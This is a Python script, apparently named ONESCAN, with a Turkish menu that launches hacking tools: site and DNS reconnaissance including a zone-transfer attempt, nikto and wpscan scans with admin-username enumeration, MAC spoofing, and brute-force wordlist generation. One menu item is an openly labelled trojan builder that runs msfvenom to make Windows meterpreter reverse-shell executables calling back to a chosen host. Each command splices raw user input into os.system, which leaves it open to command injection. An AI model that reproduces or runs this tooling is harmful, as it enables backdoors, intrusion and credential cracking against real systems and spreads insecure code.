#!/usr/bin/env python
import os
import time
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet ONESCAN")

print(""" 

"Basit Arayüz, Güvenli Sonuçlar: Kullanımı Kolay, Taraması Hızlı!"

                                                        **************
                                                       * HOŞ GELDİNİZ *
                                                        **************
                                                        
1)  Dmitry (Ağ Açıkları Tespiti)

2)  Dig (Aktif Bilgi TOplama)

3)  ike-scan (VPN Kontrol)

4)  Nikto (Zaafiyet Tarama)

5)  Lynis (Zaafiyet Tarama)

6)  Mac Kontrol 

7)  P0F (Network Dinlemesi)

8)  theHarvester (Hedef Ip İle İlgili Yığın Veri Toplar.)

9)  Trojen Oluşturma Aracı

10) Wordpress (Wordpress Kullanacan Siteler Üzerinde Tarama Yapar.)

11) Worldlist (“Brute force” Saldırısı Yapabilmek İçin Bizlere Wordlist Oluşturur.)

12) Wafw00f (Hedef Websitenin WAF GÜvenlik Duvarını Kullanıp Kullanmadığını Tespit Eder.)

13) Whois (Hedef Websitenin Alan Adının Kim Tarafından Kaydedildiğini Tespit Eder.)

""")

sec = input("Kullanmak istediğiniz aracın numarasını giriniz: ")

if sec == "1":
    os.system("figlet DMITRY TARAMA ARACI")
    print("""
                                                       **********************************
                                                     * DMİTRY TARAMA ARACINA HOŞ GELDİNİZ *
                                                       **********************************
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç, bilgi toplama süreçlerinde, güvenlik açıklarını keşfetme ve ağ keşfi yapma gibi birçok farklı senaryoda kullanılabilir.(açık ve kapalı portları tespit eder.)|
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
""")
    site = input("SİTE ADRESİ GİRİN: ")
    os.system("dmitry -iwnsepf " + site)
    print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
    
    yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
    if yenidenbaslat =="y":
          os.system("python araç.py")
   

   

elif sec == "2":
    os.system("figlet DIG AKTIF BILGI TOPLAMA ARACI")
    print("""
                                                                      ********************************************
                                                                    * DİG AKTİF BİLGİ TOPLAMA ARACINA HOŞ GELDİNİZ *
                                                                      ********************************************
                                                                      
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Dig, bir website üzerinde DNS üzerinden  aktif bilgi toplama aracı olarak bilirin. Bu araçla websitelerin mail sunucularını,yardımcı domainleri görüntüleyebilir ve çeşitli bilgiler elde edebilir.|
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

1) DNS KONTROL
2) MAİL SUNUCULAR TARAMASI 
3) YARDIMCI DOMAİN TARAMASI
4) YARDIMCI DOMAİN AÇIK TARAMASI
5) YARDIMCI DOMAİN İLE VERSİYON NUMARASI ÖĞRENME
""")
    islemno = input("İŞLEM NUMARASI GİRİNİZ: ")
    site = input("SİTE ADI GİRİNİZ: ")

    if islemno == "1":
        os.system("dig " + site + " A")
    elif islemno == "2":
        os.system("dig " + site + " MX")
    elif islemno == "3":
        os.system("dig " + site + " NS")
    elif islemno == "4":
        site2 = input("YARDIMCI DOMAİN GİRİN: ")
        os.system("dig @" + site2 + " zanetransfer.me axfr")
    elif islemno == "5":
        site2 = input("YARDIMCI DOMAİN GİRİN: ")
        os.system("dig @" + site2 + " version.bind chaos txt")
    print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
    
    yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
    if yenidenbaslat =="y":
          os.system("python araç.py")

    

elif sec =="3":
     os.system("figlet VPN KONTROL ARACI")
     print(""" 
                                 ********************************
                               * VPN KONTROL ARACINA HOŞ GELDİNİZ *
                                 ********************************
------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,taradığınız ip adresinin bir vpn sunucu olup olmadığını kontrol eder.|
------------------------------------------------------------------------------------------------
""")


 
     ip = input("HEDEF IP GİRİN: ")
     os.system("ike-scan " + ip)
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")

    
     
     
     
elif sec =="4":
     os.system("figlet ZAAFIYET TARAMA ARACI")
     print(""" 
                                               ************************************
                                             * ZAAFİYET TARAMA ARACINA HOŞ GELDİNİZ *
                                               ************************************


--------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,web siteniz ve uygulamanızdaki olası güvenlik tehditlerini bulmanıza yardımcı olan açık kaynaklı bir tarayıcıdır.|
--------------------------------------------------------------------------------------------------------------------------------------------


""")
     hedefip = input("IP GİRİN: ")
     os.system("nikto -h " + hedefip)
     print("\033[92mİŞLEM BARAYIYLA TAMAMLANDI...") 
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")        
     
     
elif sec =="5":
     os.system("figlet LYNIS ZAAFIYET TARAMA ARACI")
     print(""" 
                                   ******************************************
                                 * LYNIS ZAAFİYET TARAMA ARACINA HOŞ GELDİNİZ *
                                   ******************************************
-------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Sisteminizin üzerinde detaylı bir zaafiyet taraması yapar ve bir rapor halinde size sunum yapar.|
-------------------------------------------------------------------------------------------------------------------


""")
     os.system("lynis audit system")
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")   
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py") 
    
elif sec=="6":

    print("""
                               ***********************************
                             * MAC DEĞİŞTİRME ARACıNA HOŞ GELDİNİZ *
                               ***********************************
 
----------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,MAC adresinizi istediğiniz bir şekilde hızlıca değiştirebilmenizi sağlar.|
----------------------------------------------------------------------------------------------------

1) MAC ADRESİNİ RANDOM BELİRLE
2) MAC ADRESİNİ ELLE BELİRLE
3) MAC ADRESİNİ ORJİNALE DÖNDÜR
""")
    no = input("İŞLEM NUMARASI GİRİNİZ: ")
    if no == "1":
        os.system("sudo ifconfig eth0 down")
        os.system("sudo macchanger -r eth0")
        os.system("sudo ifconfig eth0 up")
        print("\033[92mYENİ MAC ADRESİ RANDOM BELİRLENDİ.")
    elif no == "2":
        adres = input("YENİ MAC ADRESİNİ GİRİN: ")
        os.system("sudo ifconfig eth0 down")
        os.system("sudo macchanger --mac " + adres + " eth0")
        os.system("sudo ifconfig eth0 up")
        print("\033[92mYENİ MAC ADRESİ ELLE BELİRLENDİ.")
    elif no == "3":
        os.system("sudo ifconfig eth0 down")
        os.system("sudo macchanger -p eth0")
        os.system("sudo ifconfig eth0 up")
        print("\033[92mMAC ORJİNALE DÖNDÜ.")

        os.system("ifconfig eth0 up")
        print("\033[92mMAC ORJİNALE DÖNDÜ.")
        
        yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
        if yenidenbaslat =="y":
          os.system("python araç.py")
     
        
elif sec =="7":
        os.system("figlet P0F BILGI TOPLAMA ARACI")
        print(""" 
                                                                        **************************************
                                                                      * P0F BİLGİ TOPLAMA ARACINA HOŞ GELDİNİZ *
                                                                        **************************************

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,network üzerinden dinleme yaparak gelip giden paketlerden paketleri gönderen sistemlerin hangi işletim sistemine sahip olduğunu belirlemek için kullanılan bir araçtır.|
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

""")
        os.system("sudo p0f -i eth0")
        print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
        
        yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
        if yenidenbaslat =="y":
          os.system("python araç.py")
        
        
elif sec =="8":
     os.system("figlet THEHARVESTER")
     print(""" 
                                           *****************************************************
                                         * THEHARVESTER PASİF BİLGİ TOPLAMA ARACINA HOŞ GELDİNİZ *
                                           *****************************************************

------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,size hedef hakkında yığın bir veri toplar. Bu verileri analiz ederek hedefiniz hakkında bilgi sahibi olursunuz.|
------------------------------------------------------------------------------------------------------------------------------------------

""")
     site = input("SİTE ADRESİ GİRİNİZ: ")
     no = input("KAÇ KERE TARAMA YAPILSIN: ")
     os.system("theHarvester -d " + site + " -l " + no + " -b all")
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")
     
elif sec =="9":
     os.system("figlet TROJEN OLUSTURMA ARACI")
     print(""" 
                                           *************************************
                                         * TROJEN OLUŞTURMA ARACINA HOŞ GELDİNİZ * 
                                           *************************************
---------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,zararlı kod üretmemizi sağlayan ve karşı taraftan reverse bağlantı almamızı sağlayan bir araçtır.|
---------------------------------------------------------------------------------------------------------------------------


""")
     ip = input("LOCAL VEYA DIŞ IP GİRİN: ")
     port = input("PORT GİRİN: ")
     trojenisim = input("OLUŞTURACAĞINIZ BACKDOOR'UN İSMİNİ GİRİNİZ: ")
     print(""" 
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
     islemno = input("İŞLEM NO GİRİN: ")
     kayityeri = input("KAYİT YERİ GİRİNİZ: ")
     if(islemno=="1"):
         os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + trojenisim + ".exe")
     elif(islemno=="2"):
         os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + trojenisim + ".exe")
     elif(islemno=="3"):
         os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + trojenisim + ".exe")       
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")  
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")
         
elif sec =="10":
     os.system("figlet WORDPRESS ARACI")
     print(""" 
                                               *************************************
                                             * WORDPRESS TARAMA ARACİNA HOŞ GELDİNİZ *
                                               *************************************
                                               
-----------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bir web sitesinin wordpress kullanıp kullanmadığını tespit eder,kullanıyorsa site üzerinde açık taraması yapar.|
-----------------------------------------------------------------------------------------------------------------------------------

1) HIZLI TARAMA
2) EKLENTİ TARAMA
3) TEMA TARAMA
4) YÖNETİCİ KULLANICI ADI TARAMA
""")

     islemno = input("İŞLEM NUMARASI GİRİNİZ: ")

     if islemno == "1":
       site = input("SİTE ADRESİ GİRİN: ")
       os.system("wpscan --url \"" + site + "\" --ignore-main-redirect")
       print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     elif islemno == "2":
       site = input("SİTE ADRESİ GİRİN: ")
       os.system("wpscan --url \"" + site + "\" --enumerate p --ignore-main-redirect")
       print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     elif islemno == "3":
       site = input("SİTE ADRESİ GİRİN: ")
       os.system("wpscan --url \"" + site + "\" --enumerate t --ignore-main-redirect")
       print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     elif islemno == "4":
       site = input("SİTE ADRESİ GİRİN: ")
       os.system("wpscan --url \"" + site + "\" --enumerate u --ignore-main-redirect")
       print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
       
       yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
       if yenidenbaslat =="y":
          os.system("python araç.py")
elif sec =="11":
     os.system("figlet WORLDLIST ARACI")
     print(""" 
                                                                                         ******************************
                                                                                       * WORLDLİST ARACINA HOŞ GELDİNİZ *
                                                                                         ******************************

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Wordlist, içerisinde birçok farklı sözcük ve şifre barındıran kelime listesidir. Bu kelime listeleri şifre kırmaya yönelik saldırılarda kullanılarak kullanıcıların şifrelerini ele geçirmeye yardımcı olur.|
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



""")
     min = input("MİNİMUM KARAKTER SAYİSİNİ GİRİNİZ: ")
     max = input("MAXİMUM KARAKTER SAYİSİNİ GİRİNİZ: ")
     karakter = input("İSTEDİĞİNİZ KARAKTERLERİ GİRİNİZ: ")


     os.system("crunch " + min + " " + max + " " + karakter + " " )
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")
elif sec =="12":
     os.system("figlet GUVENLIK DUVARI TARAMASI")
     print("""                                              
                                                       ******************************************************
                                                     * WAAFW00F GÜVENLİK DUVARU TARAMASI ARACINA HOŞ GELDİNİZ * 
                                                       ******************************************************
                                                       
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç, belirli bir web sunucusuna yönelik yapılan isteklerden gelen yanıtları analiz ederek, WAF'ın kullanılıp kullanılmadığını tespit eder.|
-----------------------------------------------------------------------------------------------------------------------------------------------------------------

""")
     site= input("SİTE ADRESİ GİRİN: ")
     os.system("wafw00f " + site)
     print("\033[92mİŞLEM BAŞARIYLA TAMAMLANDI.")
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")
elif sec =="13":
     os.system("figlet  WHOIS PASIF BILGI TOPLAMA ARACI")
     print(""" 
                                                      **********************************************
                                                    * WHOİS PASİF BİLGİ TOPLAMA ARACINA HOŞ GELDİNİZ *
                                                      **********************************************

----------------------------------------------------------------------------------------------------------------------------------------------------------
|-> Aracın amacı: Bu araç,bir alan adının kaydedilip kaydedilmediğini, kim tarafından kaydedildiğini ve ne zaman kaydedildiğini gösteren bilgiler sağlar.|
----------------------------------------------------------------------------------------------------------------------------------------------------------


""")
     site = input("site adi girin: ")
     os.system("whois " + site)
     print("\033[92mİŞLEM BARAYIYLA TAMAMLANDI...")
     
     yenidenbaslat = input("ARAÇ YENİDEN BAŞLATILSIN MI ? (y/n): ")
     if yenidenbaslat =="y":
          os.system("python araç.py")
else:
    print("Hatalı Araç Numarası Girdiniz Araç Yeniden Başlatılıyor...")
    time.sleep(3)
    os.system("python araç.py")








  

     
   



